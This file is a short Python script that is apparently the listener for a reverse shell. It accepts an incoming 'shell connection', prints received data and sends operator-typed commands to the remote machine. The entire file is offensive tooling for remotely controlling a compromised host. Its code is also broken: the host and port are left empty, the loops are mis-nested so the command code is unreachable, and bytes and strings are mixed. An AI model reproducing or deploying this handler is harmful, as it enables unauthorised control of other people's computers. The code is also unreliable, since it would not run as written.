import socket
import sys

host = ""
port = ""

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(5)

print("[*] server bound to %s:%d" % (host, port))
connected = False
while 1:
    if not connected:
        (client, address) = server.accept()
        connected = True

    print("[*] Accepted Shell Connection")
    buffer = ""

while 1:
    try:
        recv_buffer = client.recv(4096)
        print("[*] Received: %s" % recv_buffer)
        if not len(recv_buffer):
            break
        else:
            buffer += recv_buffer
    except:
        break
command = input("Enter Command>")
client.sendall(command + "\r\n\r\n")
print("[*] Sent => %s" % command)
